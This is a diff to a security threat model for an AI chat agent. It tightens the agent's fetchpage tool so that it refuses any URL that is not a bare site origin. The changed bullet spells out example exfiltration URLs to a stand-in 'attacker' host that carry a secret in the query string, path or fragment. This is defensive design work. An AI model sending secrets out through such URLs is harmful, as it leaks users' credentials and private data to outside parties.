@@ -94,11 +94,14 @@ Mitigations (all wired in `src/session.ts` / `src/web.ts`):
 - **No file-mutation tool survives**, so there is no write channel to tamper with
   `index.ts`/`config.json`; the `allowedChatIds` allow-list and the bash gate
   can't be edited away by the model.
-- **`fetchpage` refuses query-bearing URLs.** The remaining exfiltration channel
-  would be `fetchpage` to `https://attacker/?data=<secret>`; `safeFetch` only
-  blocks private hosts, so a public server is fine. fetchpage now refuses any URL
-  with a query string (websearch posts its query in the body and is unaffected),
-  and with `read` excluded the model has no secret source to leak anyway.
+- **`fetchpage` refuses any non-origin URL.** The remaining exfiltration channel
+  would be `fetchpage` to a public server carrying a secret in the URL — in the
+  query string (`https://attacker/?data=<secret>`), the path
+  (`https://attacker/<secret>`), or the fragment (`https://attacker/#<secret>`);
+  `safeFetch` only blocks private hosts, so a public server is fine. fetchpage
+  now refuses any URL that is not a bare site origin (no path, query, or
+  fragment — websearch posts its query in the body and is unaffected), and with
+  `read` excluded the model has no secret source to leak anyway.
 
 Ceiling: still a container/VM/VPS (pi's docs point at a Gondolin micro-VM).
 
